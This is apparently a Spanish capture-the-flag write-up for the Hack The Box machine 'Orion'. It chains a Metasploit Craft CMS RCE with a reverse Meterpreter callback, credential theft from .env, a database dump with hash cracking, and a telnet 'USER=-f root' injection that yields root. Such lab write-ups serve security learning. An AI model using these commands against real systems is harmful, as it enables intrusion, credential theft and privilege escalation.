# Orion — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Orion](https://app.hackthebox.com/machines/Orion) |
| **Plataforma** | [Hack The Box](https://hackthebox.com/) |
| **Sistema Operativo** | Linux (Ubuntu 22.04.5 LTS) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

Se lanza un escaneo completo con Nmap contra el objetivo:

```bash
nmap -p- -sCV -T5 10.129.60.253 -oN Orion
```

![Nmap Scan](images/01.JPG)

Servicios encontrados:

| Puerto | Servicio | Versión |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
| 80/tcp | HTTP | nginx 1.18.0 (Ubuntu) |

Nmap indica que el servicio HTTP no sigue la redirección a `http://orion.htb/`, lo que apunta a virtual hosting basado en nombre.

### Archivo hosts

Se añade el hostname `orion.htb` al archivo `/etc/hosts` apuntando a la IP objetivo:

![/etc/hosts](images/02.JPG)

---

## Enumeración Web

### Página de aterrizaje

Al navegar a `http://orion.htb/` se muestra una página corporativa de **"Orion Telecom"**, una empresa de telecomunicaciones ficticia:

![Landing page de Orion Telecom](images/03.JPG)

Al bajar hasta el pie de página se revela la tecnología subyacente:

![Pie de página CraftCMS](images/04.JPG)

```
© 2026 Orion Telecom
Powered by CraftCMS
```

### Fuzzing de directorios

Se utiliza `ffuf` para descubrir rutas ocultas:

```bash
ffuf -u http://orion.htb/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Resultados de FFUF](images/05.JPG)

Rutas relevantes encontradas: `index`, `assets` (`301`), `admin` (`302`), `logout` (`302`).

### Panel de administración

Al navegar a `/admin/login` se confirma el panel de administración de **Craft CMS**, junto con la versión exacta en uso:

![Login de administración de Craft CMS](images/06.JPG)

```
Orion Telecom Administration
Craft CMS 5.6.16
```

---

## Explotación — Craft CMS Pre-Auth RCE (CVE-2025-32432)

### Búsqueda de vulnerabilidades

Una búsqueda de vulnerabilidades conocidas para esta versión concreta arroja una PoC pública:

![Resultados de Google](images/07.JPG)

**CVE-2025-32432** afecta a **Craft CMS ≤ 5.6.16** y permite ejecución remota de código no autenticada, encadenando una inyección en el parámetro de transformación de imágenes con un gadget de deserialización de `PhpManager` de Yii2, combinado con **envenenamiento del access-log de nginx** para introducir en disco un payload PHP malicioso.

### Explotación con Metasploit

En lugar de reproducir la cadena manual, se utiliza el módulo ya preparado de Metasploit:

```bash
msfconsole
search CVE-2025-32432
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
```

![Selección del módulo de Metasploit](images/08.JPG)

Se configuran las opciones del módulo y se lanza el exploit:

```
set rhosts orion.htb
set rport 80
set lhost 10.10.14.70
exploit
```

![Sesión de Meterpreter abierta](images/09.JPG)

Se confirma que el objetivo es vulnerable, el payload se inyecta mediante el envenenamiento del log y se dispara, abriéndose una **sesión de Meterpreter** como `www-data`.

---

## Post-Explotación — Obtención de credenciales

### Lectura del archivo `.env`

Desde la shell web se inspecciona la raíz de la aplicación. Las aplicaciones de Craft CMS suelen almacenar la configuración sensible en un archivo `.env`:

```bash
cd ..
ls -la
cat .env
```

![Contenido del archivo .env](images/10.JPG)

El archivo revela unas **credenciales de MySQL** funcionales:

```
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

### Enumeración de la base de datos

Las credenciales filtradas se usan para conectarse directamente a la instancia local de MySQL y enumerar la base de datos `orion`:

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SHOW TABLES;'
```

![Tablas de la base de datos](images/11.JPG)

Se vuelca la tabla `users`:

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'select * from users;'
```

![Volcado de la tabla users](images/12.JPG)

Esto revela la cuenta de administrador:

| Campo | Valor |
|---|---|
| **username** | `admin` |
| **email** | `adam@orion.htb` |
| **password (hash bcrypt)** | `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxob0OGMbXo8NHp3P/B42LUg0lS` |

### Crackeo del hash

El hash se guarda localmente y se crackea offline con `hashcat`, usando el modo `3200` (bcrypt):

```bash
hashcat -m 3200 hash.txt --show
```

![Contraseña crackeada](images/13.JPG)

La contraseña recuperada es **`darkangel`**.

---

## Acceso Inicial

### SSH como adam

Las credenciales recuperadas pertenecen a la cuenta del sistema `adam` (el correo `adam@orion.htb` lo refleja) y se reutilizan para conectarse por SSH:

```bash
ssh adam@orion.htb
```

![Login SSH y user.txt](images/14.JPG)

Se confirma el acceso en **Ubuntu 22.04.5 LTS**, y se lee la flag `user.txt` desde el directorio home.

---

## Escalada de Privilegios — Bypass de autenticación en Telnet (CVE-2026-24061)

### Enumeración de servicios locales

Se revisan los puertos en escucha desde la shell de `adam`:

```bash
ss -tulnp
```

![Puertos en escucha](images/15.JPG)

Se encuentra un servicio **Telnet** escuchando en `127.0.0.1:23` — inaccesible desde el exterior, pero alcanzable localmente. Se comprueba su versión:

```bash
telnet --version
```

```
telnet (GNU inetutils) 2.7
```

### Búsqueda de vulnerabilidades

Una búsqueda revela que **GNU inetutils telnetd ≤ 2.7** está afectado por **CVE-2026-24061**, un bypass de autenticación mediante **inyección en la opción `NEW-ENVIRON` de Telnet**. Inyectando una variable de entorno `USER=-f root` durante la negociación de opciones de telnet, el `telnetd` vulnerable la pasa sin sanitizar a `login`, que interpreta `-f root` como una instrucción para iniciar sesión como `root` **sin contraseña**:

![Detalles técnicos de CVE-2026-24061](images/16.JPG)

```
login -f root
```

### Explotación

El bypass se dispara localmente contra el servicio Telnet en loopback, estableciendo la variable de entorno `USER` antes de invocar el cliente:

```bash
USER="-f root" telnet -a 127.0.0.1
```

![Shell de root obtenida](images/17.JPG)

El cliente se conecta, negocia la variable `NEW-ENVIRON` envenenada, y `telnetd` deja caer la sesión directamente en una **shell interactiva de root** — sin necesidad de contraseña:

```
root@orion:~# cat root.txt
```

Se lee la flag de root, completando la máquina.

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port scan | `nmap` |
| Enumeración web | Fuzzing de directorios + fingerprinting de tecnología | `ffuf` |
| Búsqueda de vulnerabilidades | Búsqueda de CVE pública para Craft CMS 5.6.16 | Google, GitHub |
| Explotación | RCE no autenticada — Craft CMS (CVE-2025-32432) | Metasploit |
| Post-explotación | Obtención de credenciales desde `.env` | `cat`, `mysql` |
| Acceso a credenciales | Volcado de base de datos + crackeo offline de hash | `mysql`, `hashcat` |
| Acceso inicial | SSH con credenciales crackeadas | `ssh` |
| Escalada de privilegios | Bypass de autenticación `NEW-ENVIRON` en Telnet (CVE-2026-24061) | `telnet` |
